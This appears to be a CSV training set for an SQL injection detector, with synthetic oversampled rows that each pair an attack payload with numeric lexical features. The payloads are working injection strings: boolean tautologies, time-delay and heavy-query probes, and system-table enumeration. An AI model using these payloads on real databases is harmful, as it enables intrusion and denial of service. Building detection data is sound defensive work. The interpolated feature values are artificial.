id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001797,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000052,0.5663189082923848,182.15719871737346,32.88665203449712,3.722725000246711,54.659956103491346,25.418643255195388,73.0146169172902,29.06398244139654,0.2998604500706394,0.13926518174469785,0.4010851471628096,0.1597892210218532,1.1773304068994233,0.0,0.0,0.0,0.0,1.177330406899423,0.0,16.354660813798848,0.0,1.0,3.0,7.53199122069827,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.1773304068994233,0.0,0.17733040689942325,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.354660813798847
SMOTE_001798,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,0.8206747409713828,62.05389221508888,24.177145708489505,3.758126974432892,14.849800399054935,19.32734530943457,21.36327345282715,6.513473053772216,0.23697364587556696,0.326330258739627,0.3368348706301865,0.09986122475461955,0.0,1.504491017924073,1.0,0.0,0.0,1.8318363273586424,0.0,1.8408183632067878,0.0,0.1681636726413578,0.1681636726413578,2.831836327358642,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.8318363273586422,0.0,0.16816367264135773,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001799,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000068,1.8561541929354661,367.4720067862148,39.06214810397205,3.6168918013769433,111.79507065887859,38.2049293411214,162.00616167640175,55.4658451098131,0.3045233111275913,0.10376944969430926,0.4406947982772342,0.15101244090086527,0.0,4.0,0.0,0.0,0.0,2.26707744509345,0.0,34.5341548901869,0.0,1.4658451098130993,3.1987676647196492,12.267077445093449,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.7329225549065497,1.2670774450934503,0.0,0.0,0.7329225549065497,1.2670774450934503,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2670774450934503,3.469446951953614e-18,0.0,0.0,0.0,8.335387225467253,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,13.869542115654152
SMOTE_001800,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000053,4.200578558301607,154.695484615153,34.898494871717666,4.246812047443359,77.26692359009874,12.417290769091798,45.353377435557725,19.657892820404733,0.5038860671968225,0.07914212485915456,0.29063350413887057,0.1263383038051524,5.518795897374132,0.0,0.37969897434353295,0.0,0.6203010256564669,1.3796989743435328,0.0,5.518795897374132,0.0,0.0,1.860903076969401,3.898494871717665,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.379698974343533,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3796989743435331,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3796989743435331,0.3796989743435331,5.139096923030599
SMOTE_001801,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000010,0.6990258644018026,45.81221002578229,13.919083532444978,2.627239409912385,3.306361177481655,11.297708831112443,24.289056484743227,6.919083532444976,0.0754598150996322,0.24186961719403668,0.5283086770859244,0.15436189062040664,0.8468194112591705,0.0,0.1531805887408294,0.0,0.15318058874082954,1.1531805887408293,0.0,3.7659029437041474,0.8468194112591705,0.0,0.0,1.4595417662224879,0.8468194112591705,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.15318058874082946,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1531805887408293
SMOTE_001802,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000015,1.691253451724597,70.1921917083599,17.585156550597134,2.922388092557736,10.109180514142125,11.585156550597135,36.681252404777084,11.816602238843554,0.13174364782867726,0.1869822213545959,0.5111397105976021,0.17013442021912467,2.938867412947852,0.0,0.7074217247014323,0.0,0.6462891376492839,1.6462891376492839,0.0,5.877734825895703,0.0,0.0,0.0,3.0,1.0,0.0,0.35371086235071614,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.6462891376492839,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6462891376492839
SMOTE_001803,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000013,2.2391285179949927,57.70507933174609,20.91796826730157,3.6564144765138495,10.212888935555497,20.787111064444503,19.082031732698432,7.623047599047645,0.17995084267003256,0.35827416966811043,0.33055161131120736,0.13122337635064968,0.5410158663492144,0.45898413365078555,2.5410158663492144,0.0,0.5410158663492144,2.0,0.0,1.5410158663492144,0.0,0.0,0.0,5.082031732698429,0.5410158663492143,0.45898413365078555,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.4589841336507856,0.5410158663492144,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001804,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000066,0.010847342392558208,144.04491385737293,33.00345491210561,4.162798921248625,75.99654508789439,16.0,37.04145894526732,15.006909824211222,0.5276047876635018,0.11107932494170351,0.25713500864276784,0.1041808787520268,0.0034549121056102194,0.9965450878943897,2.0,0.0,1.0,2.0,0.0,4.006909824211221,0.0,0.0,2.0,5.0,0.0034549121056103305,0.9965450878943897,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001805,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000004,0.025701922853033802,23.010663149738036,13.005331574869015,3.257340042059002,7.002665787434502,2.0,6.013328937172531,7.994668425130989,0.30432636242001204,0.08692217987201924,0.2612602039557812,0.34749125375218753,4.986671062827465,0.002665787434507183,0.0,1.0026657874345068,1.0,0.997334212565493,0.0,0.005331574869014588,0.0,0.0,0.0,3.0,0.9973342125654929,0.0026657874345071275,0.0,0.0,1.0,0.997334212565493,0.002665787434506961,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001806,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000068,1.8420677457049925,362.9220537591083,40.20342293184717,3.7048621485922433,109.96958420917208,39.67110037719735,155.12547669095548,58.15589248178338,0.302942775485078,0.10938029782754746,0.4273993867885961,0.1602775398987785,0.0,4.0,0.3593154136305652,0.0,0.0,2.3593154136305654,0.0,32.56273834547774,0.0,2.3593154136305654,2.562738345477739,16.311784963566783,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.3593154136305653,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,4.4847921045860435,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,9.844107518216607
SMOTE_001807,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,0.3037729383657254,350.1299987207441,30.364235414518205,3.342752090264595,82.0,57.04388203688971,161.35929324474301,49.72682343911135,0.23497091240731505,0.1626445961739,0.46012507107761536,0.14225942034116956,1.0,0.0,2.9544705731852248,0.0,0.0,2.0,0.0,33.499176305037466,0.0,0.0910588536295509,0.18211770725910204,14.954470573185226,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.04552942681477545,0.9544705731852245,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,11.772352865926123,0.0,0.0,0.0,0.0,0.0,0.0,0.9544705731852245,0.9544705731852245,16.635764585481795
SMOTE_001808,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,0.5500411451129034,223.68275573928975,34.15297779448089,3.7768675657884883,66.74717783206287,35.576488897240445,87.188400075164,34.17068893482244,0.2984228400890254,0.1598874213631185,0.38964346148569545,0.15204627706216062,0.0,0.0,2.0,0.0,0.0,2.0,0.0,18.44122224310111,0.0,1.2882444486202216,3.2882444486202216,11.152977794480886,0.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.576488897240443,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.576488897240443
SMOTE_001809,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000014,1.87756207145473,138.25326781939526,30.41775593979842,3.9981263588808673,74.75980345818579,6.32897624080632,40.16448812040316,17.0,0.5404646015951193,0.04593553714469781,0.2906230913399389,0.12297676992024403,0.0,1.8355118795968397,1.1644881204031603,0.0,1.0,0.9999999999999999,0.0,5.582244060201581,0.5822440602015801,0.0,2.4177559397984196,3.1644881204031603,0.0,1.0,0.5822440602015801,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.41775593979841996,0.5822440602015801,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001810,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000027,1.6281955316431016,69.34263397780396,17.07280725272588,2.751382664797381,4.229122901090349,18.218421758177634,37.20772061526492,9.687368703271053,0.06495528335541734,0.25701251360452826,0.5343112666540472,0.1437209363860072,0.0,0.0,1.3854385494548245,0.0,0.6145614505451757,1.6145614505451757,0.0,6.0728072527258785,0.0,0.0,0.0,3.6145614505451755,0.0,0.0,0.38543854945482436,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.6145614505451756,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6145614505451755
SMOTE_001811,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000020,1.849926579723714,52.332225640494244,19.856193406137926,3.6175926072560918,9.856193406137926,20.0,16.952064468712642,5.523967765643679,0.1853600209246715,0.3838759064103918,0.3241018763553249,0.10666219630961181,0.0,0.4760322343563207,2.047935531287359,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,4.047935531287358,0.0,0.47603223435632064,0.5239677656436794,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001812,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000036,0.19514362630267854,154.19803928125484,33.8457767848567,3.9393462883320955,63.64773750360186,9.814932141828042,56.074660709140204,24.66070892668474,0.41399964182741844,0.06348257510231546,0.36285492227482896,0.15966286079543704,2.9074660709140203,0.09253392908597957,0.0,0.0,0.030844643028659857,0.0,0.0,11.72239821274206,0.0,1.93831071394268,1.0616892860573197,5.8457767848567,0.96915535697134,0.0308446430286598,0.0,0.0,3.469446951953614e-18,-1.1102230246251565e-16,1.0,0.0,0.0,3.469446951953614e-18,0.96915535697134,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001813,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000030,0.33461517100681215,275.2252344621313,38.889319208875904,3.8020887681791677,82.0,37.0,111.33591525325541,44.889319208875904,0.29795715174431914,0.13444408066511965,0.40449714926646985,0.16310161832409137,0.11068079112409901,0.8893192088759008,2.0,0.0,0.0,2.0,0.0,23.889319208875897,0.0,2.0,4.0,14.0,0.11068079112409912,0.8893192088759008,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_001814,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,1.5482585266116478,194.92275241655267,32.65391990532894,3.6861912166962187,70.07609706031585,20.76940777278946,73.03862379172367,31.038623791723673,0.3542874937056922,0.10810882948569282,0.376794069885849,0.16080960692276597,4.0,0.0,0.0,0.0,0.26921601893421165,2.0,0.0,13.846271848526307,2.0,0.7307839810657883,3.807648056802635,6.653919905328942,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.7307839810657883,0.26921601893421165,0.0,0.0,0.2692160189342116,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,3.6539199053289417,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.192351943197365
SMOTE_001815,attack,boolean,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",nearest_attack_euclidean,R000068,2.8956629280753434,356.1001131536225,36.42360928490998,3.499262834363856,98.73552708098745,41.970488393862524,160.78819535754502,54.60590232122749,0.27625501824756027,0.11843077093287183,0.45198313037870946,0.15333108044085844,0.0,4.0,0.4646992262575016,0.0,0.0,2.0,0.0,34.0,0.9293984525150034,1.0706015474849966,2.141203094969993,12.464699226257501,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.5353007737424983,1.0,0.0,0.0,0.5353007737424983,1.0,0.4646992262575017,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,9.32349613128751,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,14.323496131287506
SMOTE_001816,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,0.6419628644701693,344.96741391818057,30.63866770275491,3.365464717953548,81.4525705404958,56.083996891735275,158.16075243195513,49.270094053994384,0.23769671020322036,0.1621316593820739,0.45678797472394483,0.1433836556907609,0.9087617567492988,0.0,2.908761756749299,0.0,0.0,2.0,0.0,32.905141080991584,0.0,0.18247648650140236,0.36495297300280494,14.9087617567493,0.9087617567492987,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.09123824325070118,0.9087617567492988,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,11.543808783746494,0.0,0.0,0.0,0.0,0.0,0.0,0.9087617567492989,0.9087617567492989,16.270094053994388
SMOTE_001817,attack,boolean,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'rhzy'  =  'rhzy",nearest_attack_euclidean,R000006,0.3984920811701512,187.45628649606388,30.377980466177462,3.7191256743221084,114.84221487204792,11.622019533822538,43.99205209019343,17.0,0.6116162804629706,0.06195271871457325,0.2350708753028639,0.09136012551959223,4.0,0.0,0.0,0.0,1.0,1.874006511274179,0.0,4.000000000000001,0.0,0.0,5.622019533822536,2.874006511274179,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001818,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000039,2.5926983412668063,136.19006155205284,30.438012310410567,4.29672181171608,84.71900615520528,5.797515388013206,30.595030776026412,15.078509232807924,0.6245661840512484,0.04157532068287251,0.2233300717029281,0.11052842356295109,1.438012310410566,1.9214907671920758,0.0,0.0,1.0,0.35950307760264133,0.0,3.359503077602641,0.0,0.0,3.0,1.3595030776026409,0.35950307760264144,0.6404969223973587,0.0,0.0,3.469446951953614e-18,0.35950307760264144,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.35950307760264144,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3595030776026418
SMOTE_001819,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000040,0.5428492470285055,138.3182757129002,31.59091952365558,4.141844891925324,68.31819920609263,14.909118729748212,39.63639841218526,15.454559364874106,0.4955433718968181,0.10679745549405037,0.2861187550705082,0.11154041753862337,0.0,1.0,1.7272796824370527,0.0,1.0,1.8636398412185264,0.0,4.863639841218526,0.0,0.0,2.0,4.590919523655579,0.0,1.0,0.8636398412185263,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.8636398412185262,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8636398412185264
SMOTE_001820,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000052,1.7890389191874416,213.3991779573825,33.94563841764852,3.744287908758836,66.59228813236389,26.43204802206065,84.59228813236389,35.782553670594076,0.30990085375811194,0.1261572252616942,0.39736569028655716,0.16657623069363667,2.4592288132363893,0.0,0.0,0.0,0.0,1.4864096044121298,0.0,18.91845762647278,0.0,1.4864096044121298,3.4864096044121298,9.432048022060648,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.48640960441212977,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.97281920882426,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.45922881323639
SMOTE_001821,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000063,0.7302984969941548,278.3038442884708,37.12434406696745,3.7487536018049323,82.0,39.29859682421044,112.34850551448599,44.656741949774414,0.29682108634559246,0.14042467715791052,0.40162918203871656,0.16112505445778044,1.0,0.0,2.109456991629069,0.0,0.0,2.0,0.0,24.204026907919754,0.0,1.7810860167418623,3.562172033483725,14.109456991629068,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.8905430083709311,0.10945699162906863,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.547284958145344,0.0,0.0,0.0,0.0,0.0,0.0,0.1094569916290688,0.1094569916290688,9.87565593303255
